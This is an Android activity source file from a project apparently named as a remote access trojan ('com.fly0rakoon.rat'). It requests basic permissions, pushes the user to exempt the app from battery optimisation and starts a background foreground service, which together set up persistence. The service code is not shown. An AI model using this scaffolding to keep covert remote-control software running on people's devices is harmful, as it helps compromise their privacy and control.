package com.fly0rakoon.rat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ForegroundService;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_CODE = 101;
    private static final String TAG = "MainActivity";
    
    // Only request the MOST essential permissions first
    private final String[] INITIAL_PERMISSIONS = new String[] {
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Set a simple layout so user sees something
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "MainActivity created");
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        // Check if we need to show rationale for any permission
        boolean shouldShowRationale = false;
        for (String permission : INITIAL_PERMISSIONS) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
                shouldShowRationale = true;
                break;
            }
        }
        
        if (shouldShowRationale) {
            // Show explanation to user
            Toast.makeText(this, "This app needs basic permissions to run in background", Toast.LENGTH_LONG).show();
        }
        
        // Request permissions
        ActivityCompat.requestPermissions(this, INITIAL_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                } else {
                    Log.d(TAG, "Permission denied: " + permissions[i]);
                    allGranted = false;
                }
            }
            
            // Always proceed, even if some permissions are denied
            proceedWithSetup();
        }
    }
    
    private void proceedWithSetup() {
        // Request battery optimization whitelist (this opens a system dialog)
        requestBatteryOptimization();
        
        // Start the service directly - this will show the notification
        startService();
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
            } else {
                // Already whitelisted, just start service
                startService();
            }
        } else {
            startService();
        }
    }
    
    private void startService() {
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        Log.d(TAG, "Service start command issued");
        Toast.makeText(this, "Service starting... Check notification", Toast.LENGTH_SHORT).show();
        
        // You can finish the activity or keep it open
        // finish(); // Uncomment if you want to close the app
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_CODE) {
            Log.d(TAG, "Returned from battery optimization settings");
            startService();
        }
    }
}
